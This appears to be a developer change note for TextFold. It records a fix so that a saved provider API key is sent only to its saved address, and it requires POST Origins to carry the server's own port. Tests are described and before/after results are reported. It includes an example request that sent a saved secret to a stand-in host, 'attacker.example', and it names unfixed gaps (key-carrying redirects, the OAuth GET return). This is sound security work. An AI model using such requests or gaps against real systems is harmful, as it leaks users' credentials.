# A saved key goes only to its saved address

**Date:** 2026-10-23
**Branch:** `worktree-provider-key-address`

## What and why

The pre-push audit found that `POST /api/providers/probe` would take a saved provider's key — or the OpenRouter key
minted by one-click authorisation — and send it to a `base` the request supplied, while the Origin check accepted any
localhost port. A page on another local port could therefore make TextFold hand a saved key to an arbitrary host. The
save route had the same reuse: it kept `old.api_key` while taking a new `base` from the body. Now a key the server
holds is used only for the address it was kept for, a key typed in the request may still be tested against any
address, and a writing POST's Origin must be this server's own local name and port. On the old code, a probe with
`{"key": "acme", "base": "https://attacker.example/v1"}` returned 200 and `providers.probe` received
`("https://attacker.example/v1", "sk-acme-secret")`; a POST with an Origin on another local port returned 200. After
the change both are refused (400 and 403) and no probe is made.

## The change

- `textfold/server.py` — `same_origin(origin, port)` (a local name, the server's port, no userinfo) and its use in
  `do_POST`; `OPENROUTER_BASE`, `_secret`, `_same_base`, `probe_key`; `/api/providers/probe` uses `probe_key`;
  `/api/providers/save` refuses to move a held key to another base without a typed key (checked inside the
  `models.update_settings` callback); route docstring.
- `textfold/web/app.js` — the provider dialog's Save now catches a refused save and shows the server's message beside
  the form, as Fetch already did; before, it failed silently.
- `tests/test_provider_keys.py` — new, six tests: a saved key is refused on another address and used on its own; a typed
  key may go anywhere; a minted key goes only to OpenRouter and is not consumed by a refused save; save does not move a
  held key; ten typed saves moving the base race forty probes alternating between the old and the new address, and the
  recorder never receives the saved secret at the new one; the dialog shows a refusal.
- `tests/test_server_host.py` — `same_origin` unit cases (another port, another local name, userinfo, trailing dot,
  malformed port, `https`, `null`, no Origin), and a route test: another local port 403, the server's own port and a
  request with no Origin 200.
- `SECURITY.md` — the Origin rule is stated for writing POSTs, with the no-Origin case, and the OAuth return is named
  as a known gap; the held-key rule is added.
- `docs/DEVELOPMENT.md` — the provider paragraph states both rules.

## Docs checked

- `SECURITY.md` — updated: writing POSTs and the Origin port, the no-Origin case, the OAuth return as a known gap, and
  the held-key rule.
- `docs/DEVELOPMENT.md` — updated: the provider paragraph states the probe/save rule, the Origin port and the GET
  return.
- `README.md` / `README.zh-CN.md` — not needed: no user-facing promise changes; `SECURITY.md` carries the security
  statement.
- `docs/format.md`, `docs/notes-format.md`, `docs/reading-card-format.md` — not needed: no stored format changes.
- `docs/requirements/` — none covers this; the audit under `notes/` is the working note.
- `site/`, `pyproject.toml`, `requirements.txt`, `NOTICE`, `LICENSE`, `CONTRIBUTING.md`, `docs/changes/README.md`,
  `docs/upstream/README.md`, `desktop-mygo/README.md`, `.claude/agents/`, `CLAUDE.md`, `.claude/skills/`,
  `docs/WORKFLOW.md` — not needed: no dependency, version, contribution, desktop or process change.

## Decisions

- A key typed in the request is the caller's own and may be sent to the address they name; a key the server holds may
  not. This keeps the settings dialog working: editing a saved provider fetches its saved base with its saved key, and
  changing the address asks for the key again.
- A refused probe or save returns a sentence rather than a code; the provider dialog now shows it for a save as well as
  for a fetch.
- Another localhost port is another site to a browser, so an Origin must carry the server's own port. A request with no
  Origin is a command line or a native client, not a page; the held-key rule is what protects it. Only POSTs are
  checked: the OpenRouter return is a GET and cannot be stopped by an Origin check.
- The minted OpenRouter key is not consumed by a refused save, so correcting the address and retrying still works.

## Concurrency and locks

The save's held-key check runs inside the `models.update_settings` callback, under `_SETTINGS_LOCK`, so the old
key/base pair it checks is the one it writes. `tests/test_provider_keys.py` races ten typed saves that move the base
against forty probes alternating between the saved address and the new one: no probe ever received the saved secret at
the new address. On the old code the same test fails at the first probe to the new address, before any save.

## How it was verified

- `python .claude/hooks/verify.py` — 455 tests, OK (27.1 s); `git diff --check` prints nothing.
- `tests.test_provider_keys` and `tests.test_server_host` — 14 tests, OK, repeated.
- The old code, in a temporary tree from `git archive HEAD`: the saved key reached `attacker.example` (200, probe
  called with the secret), the save moved the secret to that base, and a POST from another local port was accepted
  (200). All nine new tests fail there (14 tests: 6 errors and 3 failures); the interleaving test fails at the first
  probe to the new address, with `("https://attacker.example/v1", "sk-acme-secret")` in the recorder. Against this
  branch the same requests are 400 and 403, and the probe is not called.
- In the Browser pane, against a server with its own temporary HOME and one saved Anthropic provider: editing it,
  fetching its models, changing the base and pressing Save showed "a key the server keeps is only sent to the address
  it was kept for" in the dialog, and the settings file still held the old base — the save was refused, not silent.
- An Origin battery: the server's own `127.0.0.1`/`localhost`/`[::1]` with its port were accepted, every other port,
  name, scheme, `null`, userinfo and malformed form was 403, and no Origin was 200.

## Measured

| | before | after |
|---|---|---|
| probe with a held key and another base | 200, key sent | 400, no call |
| POST from another local port | 200 | 403 |
| a refused save in the dialog | (no such refusal) | message shown, settings unchanged |
| suite | 446 tests, OK | 455 tests, OK, 27.1 s |

## Not measured

- Zoom smoothness: the reader is untouched, and it stays unmeasured on this machine (`tools/zoombench.py` needs
  `playwright` and exported comparison pages, neither installed).
- The desktop app itself: its WebView loads `http://127.0.0.1:<port>/`, so its Origin has the server's port by
  construction, but this was not exercised. A local proxy serving the app on another port would now be refused; that
  is not a supported setup.
- A real MinerU conversion or a real OpenRouter exchange: the settings state and the state mutation were checked, not
  the traffic.

## Pitfalls

- The Origin check covers POSTs only. The OpenRouter return (`/oauth/openrouter`) is a GET: a page can call it and
  consume a pending authorisation (the reader can start again; no key is exposed). `SECURITY.md` names it as a known
  gap; an Origin check cannot fix a top-level navigation, and binding the return needs its own state/nonce.
- A request with no Origin is allowed (command line, native desktop calls). A native client can forge an Origin
  anyway; with the user's rights it can also read the settings file. The held-key rule is the boundary that does not
  depend on the Origin.
- The probe still follows redirects with the key — a separate audit finding, not fixed here. The claim is about the
  address of the request; a saved address that redirects can send the key elsewhere.
- `POST /api/settings` can still move the MinerU key to a new address for a no-Origin caller (the browser vector is
  closed by the Origin rule). That is the audit's separate MinerU finding.
- `_same_base` strips a trailing slash and folds case, so an address that differs only that way counts as the saved
  one; the host cannot change that way.
- The Origin parser rejects userinfo and a trailing dot, and the unit tests pin both.

## Rejected

- Refusing every probe of a saved provider without a retyped key — breaks the edit dialog for no gain; the saved base
  is the key's own address.
- Requiring the Origin's name to equal the Host's name — the app may be opened as `localhost` or `127.0.0.1`; the port
  is the boundary that matters.
- Refusing probe and OAuth under `TEXTFOLD_NO_MODELS` — a settings action can still list models; the held-key rule is
  what closes the leak.
- Dropping the key on redirects in `providers.probe` — a separate audit finding, and it belongs with the redirect
  fixes in `llm_openai.py` and `engine.py`.
- Checking the saved key/base outside `update_settings` — the check would race the write; it runs in the callback.
